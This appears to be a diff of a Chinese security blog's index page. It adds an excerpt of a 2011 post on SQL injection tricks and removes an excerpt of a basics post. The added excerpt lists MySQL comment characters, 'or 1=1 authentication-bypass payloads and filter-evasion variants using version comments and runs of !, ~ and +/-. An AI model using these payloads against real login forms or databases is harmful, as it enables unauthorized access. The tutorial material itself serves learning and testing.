@@ -236,6 +236,137 @@
             
               
                 
+                <a class="post-title-link" href="/anquan_sqlinjjiqiao.html" itemprop="url">
+                  SQL注入技巧
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2011-04-26T00:00:00+08:00" content="2011-04-26">
+              2011-04-26
+            </time>
+          </span>
+
+          
+            <span class="post-category">
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/anquan_sqlinjjiqiao.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="anquan_sqlinjjiqiao.html" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><hr>
+<h1 id="0x01-MYSQl灵活的语法"><a href="#0x01-MYSQl灵活的语法" class="headerlink" title="0x01 MYSQl灵活的语法"></a>0x01 MYSQl灵活的语法</h1><hr>
+<p><strong>1 MySQL语法以及认证绕过</strong></p>
+<p>注释符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#， </div><div class="line">-- X(X为任意字符)</div><div class="line">/*(MySQL-5.1)</div><div class="line">;%00</div><div class="line">`</div><div class="line">&apos;or 1=1;%00</div><div class="line">&apos;or 1=1 union select 1,2`&apos;</div><div class="line">&apos;or 1=1 #</div><div class="line">&apos;/*!50000or*/ 1=1 -- -      //版本号为5.1.38时只要小于50138</div><div class="line">&apos;/*!or*/ 1=1 -- -</div></pre></td></tr></table></figure>
+<p>前缀：</p>
+<p>任意混合 <code>+ - ~ !</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;or --+2=- -!!!&apos;2</div></pre></td></tr></table></figure>
+<p>测试后发现<code>and/or</code>后面可以跟上偶数个<code>!、~</code>可以替代空格，也可以混合使用(混合后规律又不同)，and/or前的空格可以省略</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;or- -!!!1=1；</div></pre></td></tr></table></figure>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/anquan_sqlinjjiqiao.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/anquan_sqlmappar.html" itemprop="url">
                   SQLMAP参数解释
                 </a>
@@ -745,128 +876,6 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/anquan_sqljichu.html" itemprop="url">
-                  Sql注入基础知识
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2011-02-10T00:00:00+08:00" content="2011-02-10">
-              2011-02-10
-            </time>
-          </span>
-
-          
-            <span class="post-category">
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing">
-                  <a href="/categories/安全/" itemprop="url" rel="index">
-                    <span itemprop="name">安全</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/anquan_sqljichu.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="anquan_sqljichu.html" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h3 id="Sql注入的基本原理"><a href="#Sql注入的基本原理" class="headerlink" title="Sql注入的基本原理"></a>Sql注入的基本原理</h3><p>sql作为字符串通过Api传入给数据库，数据库将查询结果返回，数据库资深无法分别Sql的合法性，如果传入恶意Sql,将导致数据库以当前调用者的身份之星预期之外的命令并且返回结果，导致安全问题。<br>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/anquan_sqljichu.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </p></div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -910,7 +919,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">169</span>
+              <span class="site-state-item-count">170</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -918,7 +927,7 @@
           
             <div class="site-state-item site-state-categories">
               <a href="/categories">
-                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-count">18</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -927,7 +936,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">37</span>
+                <span class="site-state-item-count">39</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
